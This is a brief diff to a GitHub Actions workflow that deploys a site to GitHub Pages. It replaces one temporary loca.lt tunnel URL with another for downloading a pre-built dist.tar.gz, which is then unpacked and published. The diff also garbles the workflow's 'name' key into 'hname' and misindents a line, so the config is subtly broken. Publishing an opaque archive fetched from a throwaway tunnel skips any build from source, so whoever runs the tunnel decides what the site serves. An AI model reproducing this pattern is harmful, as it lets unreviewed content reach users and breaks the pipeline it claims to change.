@@ -1,4 +1,4 @@
-name: Deploy to GitHub Pages
+hname: Deploy to GitHub Pages
 on:
   push:
     branches: [main]
@@ -23,7 +23,7 @@ jobs:
       - name: Download pre-built dist
         run: |
           curl -fsSL -H "bypass-tunnel-reminder: true" \
-            "https://deep-llamas-relate.loca.lt/dist.tar.gz" \
+                        "https://cold-cloths-bake.loca.lt/dist.tar.gz" \
             -o dist.tar.gz
           mkdir -p dist
           tar xzf dist.tar.gz -C dist
